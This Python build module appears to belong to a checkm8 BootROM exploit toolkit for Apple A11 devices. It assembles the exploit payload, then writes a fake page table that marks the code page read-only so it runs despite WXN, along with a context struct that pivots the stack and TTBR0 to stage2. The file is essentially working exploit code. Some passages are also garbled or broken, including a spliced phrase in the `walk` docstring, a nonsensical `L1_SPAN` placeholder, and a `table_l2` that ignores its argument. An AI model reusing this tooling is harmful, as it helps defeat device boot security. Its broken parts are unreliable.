"""Build the checkm8 payload image for one part.

The payload source lives in `exploit/checkm8_payload.S` and is assembled by
the project's clang at build time, so the bytes in the tree are always the
bytes the source produces. This module is the assembler driver plus the part
that fills the page tables the exploit switches to.

Two things here are worth knowing before changing either.

**The descriptor encoder is validated against the ROM's own table, not
against the ARM ARM.** `ATTR_*` below reproduce, bit for bit, descriptors
measured out of the A11's live translation table (see
`tests/test_checkm8_payload.py`, which decodes the measured table and
re-encodes it through these constants). That matters because the attributes
this ROM uses are the ones its MAIR actually describes, and an attribute bit
pattern that looks right in the manual can still be a page the CPU will not
fetch from.

**The table layout is fixed, and the build asserts it.** The chain switches
TTBR0 to the fake L1 and the stack to the same address, so the image base,
the L1, the L2 and the context struct all have to be where the assembly
expects them. A payload assembled with a different code size is a payload
that writes its tables over its own code, and that failure is invisible until
silicon. `build()` refuses rather than emitting it.
"""

import os
import struct
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
EXPLOIT_DIR = os.path.join(HERE, "exploit")
PAYLOAD_SRC = os.path.join(EXPLOIT_DIR, "checkm8_payload.S")

# Image layout, shared with the assembly. The code must fit below the L1.
FAKE_L1_OFF = 0x4000
FAKE_L2_OFF = 0x8000
CTX_OFF = 0xC000
MAX_CODE = FAKE_L1_OFF

# Geometry of the measured regime: 36-bit VA, 16 KiB granule, two levels of
# 11 index bits. L1 index = VA[35:25], L2 index = VA[24:14], offset = VA[13:0].
L1_ENTRIES = 2048
L2_ENTRIES = 2048
PAGE = 0x4000
L1_SPAN = PAGE * L1_ENTRIES * 0x4000 // PAGE  # placeholder, computed below


def l1_index(va):
    return (va >> 25) & 0x7FF


def l2_index(va):
    return (va >> 14) & 0x7FF


# Descriptor attribute bits as the ROM's own table uses them. The field
# encodings are the ARMv8-A ones; the *values* are the measured ones.
DESC_PAGE = 3
DESC_BLOCK = 1
DESC_TABLE = 3
ATTR_IDX_EXEC = 1 << 2        # the ROM's own executable normal-memory attribute
NS = 1 << 5
AP_RW = 0 << 6                # EL1 read/write
AP_RO = 2 << 6                # EL1 read-only: executable even under WXN
SH_OUTER = 2 << 8
AF = 1 << 10
UPPER = 0x0060000000000000    # the upper attribute bits the ROM's pages carry


def page_desc(pa, ap, attr=ATTR_IDX_EXEC):
    """A level-2 page descriptor for `pa` with the given access permission.

    The measured page descriptors carry 0x6000_0000_0000_0000 in the upper
    attribute bits; the level-1 block descriptor for the ROM does not carry
    any. That asymmetry is a measurement, not a choice, and the encoder keeps
    it so a table built here is bit-identical to the ROM's own.
    """
    return (UPPER | (pa & 0x0000FFFFFFFFC000) | attr | NS | ap | SH_OUTER | AF
            | DESC_PAGE)


def block_desc(pa, ap, attr=ATTR_IDX_EXEC):
    """A level-1 block descriptor, as the ROM's own table encodes one."""
    return ((pa & 0x0000FFFFFFFFC000) | attr | NS | ap | SH_OUTER | AF
            | DESC_BLOCK)


def table_desc(next_table_pa):
    """A level-1 table descriptor pointing at a second-level table."""
    return UPPER_0 | (next_table_pa & 0x0000FFFFFFFFC000) | DESC_TABLE


# The ROM's L1[192] carries 0x8000_0000 in the upper bits rather than 0x6000,
# which is what makes it a table descriptor; measured, not assumed.
UPPER_0 = 0x8000000000000000


def walk(table, va, l2_base, depth=2, seen=None):
    """Resolve `va` through a table dict, for the build's self-check.

    Deliberately a tiny re-implementation of the two-level walk rather than a
    call into the emulator: it is here so a test can check the *shape* of the
    table this module produces in the compatibility path when Rust RPWN is unavailable
    unit test. Its correctness is established by decoding the ROM's real
    table with the same function and comparing against the emulator's
    measured translations.
    """
    if seen is None:
        seen = set()
    i1 = l1_index(va)
    e = table.get(i1)
    if e is None:
        return None
    if e & 3 == DESC_BLOCK:
        return (e & 0x0000FFFFFFFFC000) | (va & 0x1FFFFFF)
    if e & 3 != DESC_TABLE:
        return None
    l2 = table_l2(e, l2_base)
    i2 = l2_index(va)
    e2 = l2.get(i2)
    if e2 is None or e2 & 3 != DESC_PAGE:
        return None
    return (e2 & 0x0000FFFFFFFFC000) | (va & (PAGE - 1))


def table_l2(entry, l2_base):
    """The L2 dict an L1 table entry names, given where it physically is."""
    # The build writes the L2 at FAKE_L2_OFF, so the entry's address field is
    # the image-relative base the payload also uses.
    return g_l2_cache.get(l2_base)


g_l2_cache = {}


def describe(entry):
    """A short human description of a descriptor, for error messages."""
    kind = {0: "invalid", 1: "block", 3: "table/page"}[entry & 3]
    ap = (entry >> 6) & 3
    which = {0: "rw", 1: "ro-user", 2: "ro", 3: "reserved"}[ap]
    return "%s, attr=%d, ap=%s(%s), af=%d" % (
        kind, (entry >> 2) & 7, ap, which, (entry >> 10) & 1)


# ---------------------------------------------------------------------------
# assembling
# ---------------------------------------------------------------------------

class PayloadError(RuntimeError):
    pass


def _run(cmd, **kw):
    return subprocess.run(cmd, capture_output=True, text=True, **kw)


def _elf_sections(blob):
    """(section bytes, symbol dict) from an ELF64 little-endian object.

    Reading the object file here rather than shelling out to `objcopy`/`nm`
    keeps the build to one dependency: the clang that already assembles the
    rest of this tree. Anything the parser does not understand makes the build
    fail rather than silently producing a shorter payload.
    """
    if blob[:4] != b"\x7fELF":
        raise PayloadError("assembled object is not an ELF file")
    if blob[4] != 2 or blob[5] != 1:
        raise PayloadError("assembled object is not ELF64 little-endian")

    e_shoff = struct.unpack_from("<Q", blob, 0x28)[0]
    e_shentsize = struct.unpack_from("<H", blob, 0x3A)[0]
    e_shnum = struct.unpack_from("<H", blob, 0x3C)[0]
    e_shstrndx = struct.unpack_from("<H", blob, 0x3E)[0]

    raw = []
    for i in range(e_shnum):
        base = e_shoff + i * e_shentsize
        sh_name, sh_type, _flags, _addr, sh_offset, sh_size, _link, _info, \
            _align, _entsize = struct.unpack_from("<IIQQQQIIQQ", blob, base)
        raw.append(dict(name_off=sh_name, type=sh_type, off=sh_offset,
                        size=sh_size, link=_link))

    shstr = raw[e_shstrndx]

    def name_at(entry, offset):
        begin = entry["off"] + offset
        finish = blob.index(b"\0", begin)
        return blob[begin:finish].decode("utf-8", "replace")

    names = [name_at(shstr, s["name_off"]) for s in raw]
    by_name = {n: i for i, n in enumerate(names)}
    if ".payload" not in by_name:
        raise PayloadError("assembled object has no .payload section "
                           "(sections: %s)" % [n for n in names if n])
    payload_index = by_name[".payload"]
    section = blob[raw[payload_index]["off"]:
                   raw[payload_index]["off"] + raw[payload_index]["size"]]

    symbols = {}
    if ".symtab" in by_name and ".strtab" in by_name:
        symtab, strtab = raw[by_name[".symtab"]], raw[by_name[".strtab"]]
        strtab_bytes = blob[strtab["off"]:strtab["off"] + strtab["size"]]
        for k in range(symtab["size"] // 24):
            st_name, st_info, _other, st_shndx, st_value, _size = \
                struct.unpack_from("<IBBHQQ", blob, symtab["off"] + k * 24)
            if st_shndx != payload_index or st_name == 0:
                continue
            finish = strtab_bytes.index(b"\0", st_name)
            name = strtab_bytes[st_name:finish].decode("utf-8", "replace")
            if name and name not in symbols:
                symbols[name] = st_value
    return section, symbols


# The per-part constants the payload source reads, so one source assembles for
# every measured build of a part. The A11 has two builds in the corpus and they
# place the USB/context code at different addresses, so these have to move.
DEFINES = {
    "PROFILE_PIVOT": ("pivot", "0x%x"),
    "PROFILE_CTX_ENTRY": ("ctx_entry", "0x%x"),
    "PROFILE_READ_SCTLR": ("read_sctlr", "0x%x"),
    "PROFILE_WRITE_TTBR0": ("write_ttbr0", "0x%x"),
    "PROFILE_TLBI": ("tlbi", "0x%x"),
    "PROFILE_DMB": ("dmb", "0x%x"),
    "PROFILE_ROM_TTBR0": ("ttbr0", "0x%x"),
    "PROFILE_ROM_VBAR": ("vbar", "0x%x"),
}


def assemble(src=PAYLOAD_SRC, clang="clang", profile=None):
    """Assemble the payload source, returning (section bytes, symbol dict)."""
    cmd = [clang, "--target=aarch64-none-elf", "-c"]
    if profile is not None:
        for macro, (field, fmt) in sorted(DEFINES.items()):
            cmd.append("-D%s=%s" % (macro, fmt % profile[field]))
    cmd.append("-o")
    with tempfile.TemporaryDirectory() as tmp:
        obj = os.path.join(tmp, "payload.o")
        cmd += [obj, src]
        proc = _run(cmd)
        if proc.returncode != 0:
            raise PayloadError("payload assembly failed:\n" + proc.stderr)
        with open(obj, "rb") as fh:
            blob = fh.read()
    section, sym = _elf_sections(blob)
    if not section:
        raise PayloadError("assembled object has no .payload content")
    if "stage2" not in sym or "pivot_ctx" not in sym:
        raise PayloadError("payload object is missing its chain symbols: %s"
                           % sorted(sym))
    return section, sym


def build(profile, clang="clang"):
    """Assemble the payload for `profile` and fill its page tables.

    Returns (image bytes, symbol dict, notes). The notes describe what was
    placed where, because an image that is right for the wrong reason is still
    wrong.
    """
    blob, sym = assemble(clang=clang, profile=profile)
    code_end = max(addr for name, addr in sym.items()
                   if not name.startswith("fake_") and name not in
                   ("pivot_ctx", "payload_base", "gadget_table", "rom_ttbr0",
                    "rom_vbar", "rom_wxn_mask", "pwndfu_targets",
                    "pwndfu_status"))
    if code_end > MAX_CODE:
        raise PayloadError(
            "payload code is 0x%x bytes and overruns the fake table at 0x%x; "
            "the chain switches TTBR0 to 0x%x and would run its own tables "
            "over its own code" % (code_end, MAX_CODE, MAX_CODE))

    base = profile["image_base"]
    l1_base = base + FAKE_L1_OFF
    l2_base = base + FAKE_L2_OFF
    ctx_base = base + CTX_OFF

    if sym.get("fake_l1") != FAKE_L1_OFF or sym.get("fake_l2") != FAKE_L2_OFF \
            or sym.get("pivot_ctx") != CTX_OFF:
        raise PayloadError(
            "payload layout moved: fake_l1=0x%x fake_l2=0x%x ctx=0x%x, "
            "expected 0x%x/0x%x/0x%x" % (sym.get("fake_l1", -1),
                                         sym.get("fake_l2", -1),
                                         sym.get("pivot_ctx", -1),
                                         FAKE_L1_OFF, FAKE_L2_OFF, CTX_OFF))

    image = bytearray(blob)
    if len(image) < CTX_OFF + 0x100:
        image.extend(b"\0" * (CTX_OFF + 0x100 - len(image)))

    # ---- the fake L1: one table entry for the SRAM window the payload is in,
    # and the ROM's own descriptor so anything that still fetches the ROM
    # during stage2 keeps working.
    rom_desc = block_desc(profile["rom_base"], AP_RO)
    l1 = {l1_index(profile["rom_base"]): rom_desc,
          l1_index(base): table_desc(l2_base)}
    for slot, value in l1.items():
        off = FAKE_L1_OFF + slot * 8
        image[off:off + 8] = struct.pack("<Q", value)

    # ---- the fake L2: every page read-write, except the code page which is
    # read-execute. That single entry is the whole reason the fake table
    # exists: WXN is set, and a read-execute page runs even so.
    # Every L2 entry maps one 16 KiB page of the same 32 MiB window, identity,
    # which is how the ROM's own table maps it. Only the code page differs.
    window_base = base & ~0x1FFFFFF
    l2 = {}
    for i in range(L2_ENTRIES):
        va = window_base + i * PAGE
        l2[i] = page_desc(va, AP_RO if va == base else AP_RW)
    g_l2_cache[l2_base] = l2
    for slot, value in l2.items():
        off = FAKE_L2_OFF + slot * 8
        image[off:off + 8] = struct.pack("<Q", value)

    # ---- the context struct: the chain's arg0 is the table base, x28 becomes
    # x0, x29 becomes the return address, x1 becomes SP and TTBR0.
    # The pivot reads the struct from +0x78; +0x00 is not part of its field
    # list, but it is where the callback's arg0 comes from, so the host sets
    # the pair to (ctx_base, pivot) - see checkm8.py.
    ctx = {
        0x00: ctx_base,         # the callback's arg0 == this struct
        0xF8: l1_base,          # x1 -> SP, TTBR0, VBAR, ELR, SPSR
    }
    # The symbols carry the addresses the assembly resolved, so read them
    # rather than recomputing them.
    ctx[0xE8 + 0x00] = base + sym["stage2"]       # x29 -> stage2
    ctx[0xE8 + 0x08] = profile["ctx_entry"]       # x30 -> context entry
    for off, value in ctx.items():
        at = CTX_OFF + off
        image[at:at + 8] = struct.pack("<Q", value)

    notes = [
        "image base      0x%x" % base,
        "fake L1 (TTBR0) 0x%x  (entry %d -> table, entry %d -> ROM %s)"
        % (l1_base, l1_index(base), l1_index(profile["rom_base"]),
           describe(rom_desc)),
        "fake L2         0x%x  (code page rX, all other pages rW)" % l2_base,
        "context struct  0x%x  (arg0=table base, x1=table base, x29=stage2)"
        % ctx_base,
    ]
    return bytes(image), sym, notes


def build_to_file(path, profile, clang="clang"):
    image, sym, notes = build(profile, clang=clang)
    os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
    with open(path, "wb") as fh:
        fh.write(image)
    return image, sym, notes


if __name__ == "__main__":
    from . import checkm8_profile as PROF

    name = sys.argv[1] if len(sys.argv) > 1 else "t8015"
    profile = next((p for p in PROF.PROFILES.values() if p.name == name), None)
    if profile is None:
        print("unknown part %r; known: %s"
              % (name, ", ".join(p.name for p in PROF.PROFILES.values())),
              file=sys.stderr)
        raise SystemExit(2)
    image, _sym, notes = build(profile)
    print("payload for %s: %d bytes" % (name, len(image)))
    for line in notes:
        print("  " + line)
